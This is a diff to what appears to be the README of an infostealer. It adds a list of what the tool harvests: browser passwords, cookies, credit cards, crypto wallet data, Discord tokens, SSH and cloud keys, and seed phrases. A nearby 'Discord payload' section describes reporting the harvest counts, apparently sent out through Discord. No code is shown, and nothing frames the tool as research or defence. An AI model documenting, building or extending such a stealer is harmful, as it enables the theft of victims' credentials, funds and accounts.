@@ -41,6 +41,15 @@ Or:
 
 `-quiet` reduces console output.
 
+## What it collects
+
+- Passwords, cookies, history, bookmarks, autofill, credit cards  
+- Browser extensions (wallet extensions tagged separately)  
+- Desktop + browser wallet data, Discord tokens, SSH/cloud keys  
+- Sensitive files and seed phrase scan  
+
+**Not collected:** Steam, Telegram, Wi‑Fi passwords, VPN configs.
+
 ## Discord payload
 
 - Embed with harvest counts (passwords, cookies, history, wallets, etc.)
